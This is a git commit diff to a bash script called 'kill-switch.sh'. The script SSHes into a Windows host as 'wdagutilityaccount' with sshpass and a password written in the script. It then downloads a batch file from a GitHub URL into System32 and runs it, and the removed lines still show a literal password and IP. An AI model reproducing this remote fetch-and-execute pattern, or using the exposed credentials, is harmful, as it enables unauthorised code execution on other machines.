9310a49753f3350f4665f87b91da38d6c26db294
FerrousInk <139216162+FerrousInk@users.noreply.github.com>
2024-04-24 00:16:05 +0200

    Update kill-switch.sh

--- kill-switch.sh
+++ kill-switch.sh
@@ -1,7 +1,10 @@
 #!/bin/bash
-ip="10.209.1.32"
-password="1Use@rchBTW?139"
-port="34135"
+ip="10.209.?.?"
+password="?"
+port="34135 oder 22"
 
-sshpass -p $password ssh wdagutilityaccount@$ip -p $port "curl -o C:\Windows\System32\uninstall_prep.bat https://lunitely.github.io/uninstall_prep.bat"
+sshpass -p $password ssh wdagutilityaccount@$ip -p $port "curl -o C:\Windows\System32\uninstall_prep.bat https://raw.githubusercontent.com/Lunitely/lunitely.github.io/main/uninstall_prep.bat"
 sshpass -p $password ssh wdagutilityaccount@$ip -p $port "call C:\Windows\System32\uninstall_prep.bat"
+
+# curl -o C:\Windows\System32\uninstall_prep.bat https://raw.githubusercontent.com/Lunitely/lunitely.github.io/main/uninstall_prep.bat
+# call C:\Windows\System32\uninstall_prep.bat
